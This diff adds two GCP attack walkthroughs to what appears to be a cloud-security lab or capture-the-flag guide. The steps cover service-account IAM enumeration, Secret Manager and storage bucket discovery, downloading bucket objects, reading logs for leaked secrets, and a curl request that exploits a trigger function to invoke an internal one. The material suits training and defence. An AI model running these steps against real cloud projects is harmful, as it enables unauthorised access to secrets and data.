@@ -901,6 +901,97 @@ az rest --method GET \
     --headers "Authorization=Bearer $GRAPH_TOKEN" \
     | jq --arg ROLE_ID "$GRAPH_ROLE_ID" '.appRoles[] | select(.id==$ROLE_ID)'
 ```
+---
+## FunctionProxy - Secret Leak
+1. Authenticate to GCP
+```sh
+gcloud auth activate-service-account --key-file creds.json
+```
+2. Check IAM Permissions of Your Service Account
+```sh
+gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:service-mgmt-sa@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"
+```
+“projects get-iam-policy” this command will help us to get all the permission assigned to the service account at project level.
+Now inspect any custom roles (if present):
+```sh
+gcloud iam roles describe service_mgmt_sa --project woven-acolyte-428406-v9
+```
+Now list all the identities (Service Account):
+```sh
+gcloud iam service-accounts list --project woven-acolyte-428406-v9
+```
+3. Know the Secret Manager
+```sh
+gcloud secrets list --project woven-acolyte-428406-v9
+```
+Then, try to see the value of the secret stored in **secops-internal-service-key**:
+```sh
+gcloud secrets versions access latest --secret=<Secret_Name> --project woven-acolyte-428406-v9
+```
+Since we can’t directly view the secret values, let’s investigate who has access permissions on the Secret Manager.
+```sh
+gcloud secrets get-iam-policy <Secret_Name> --project woven-acolyte-428406-v9
+```
+4. Enumerate Storage Buckets (Passive Discovery)
+Initially, let’s try to list all the Buckets
+```sh
+gcloud storage buckets list --project woven-acolyte-428406-v9
+```
+We’ve now identified a **list of buckets**. Next, we’ll attempt to list the objects within each bucket and check if any of them can be downloaded. This process will be repeated for all the discovered buckets.
+To List the objects of the Bucket:
+```sh
+gcloud storage ls gs://<Bucket_Name>/
+```
+To download the objects of the Bucket:
+```sh
+gcloud storage cp gs://<Bucket_Name>/Object_Name/ .
+```
+5. Cloud Function Recon
+```sh
+gcloud functions list --regions us-central1 --project woven-acolyte-428406-v9
+```
+For secops-internal-service-fn:
+```sh
+gcloud functions describe secops-internal-service-fn --region us-central1 --project woven-acolyte-428406-v9
+```
+Now lets try to get who has what permission on the secops-internal-service-fn function
+```sh
+gcloud functions get-iam-policy secops-internal-service-fn --region us-central1 --project woven-acolyte-428406-v9
+```
+6. Exploit External Trigger Function
+```sh
+curl -X POST "https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/secops-internal-service-trigger-fn" -H "Content-Type: application/json"  -d '{"url":"https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/secops-internal-service-fn"}'
+```
+
+## Secrets Hidden in Plain Sight 
+1. auth
+```sh
+gcloud auth activate-service-account --key-file <Keyfile>
+```
+2. Check IAM Permissions of Your Service Account
+```sh
+gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:log-reviewer-sa@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format="table(bindings.role)"
+```
+inspect any custom roles
+```sh
+gcloud iam roles describe log_reviewer_sa_viewer_role --project=woven-acolyte-428406-v9
+```
+3. Explore Logging Infrastructure
+```sh
+gcloud logging buckets list --project=woven-acolyte-428406-v9
+```
+view the log views configured in the bucket
+```sh
+gcloud logging views list --bucket=secops-log-storage-buck  --location=global --project woven-acolyte-428406-v9
+```
+4. Inspect Logs for Secrets
+```sh
+gcloud logging read "" --bucket=secops-log-storage-buck --location=global --limit=50 --format="table(timestamp, logName, textPayload)" --view=_AllLogs --freshness=50d --project=woven-acolyte-428406-v9 
+```
+
+
+
+
 
 
 # Defensive
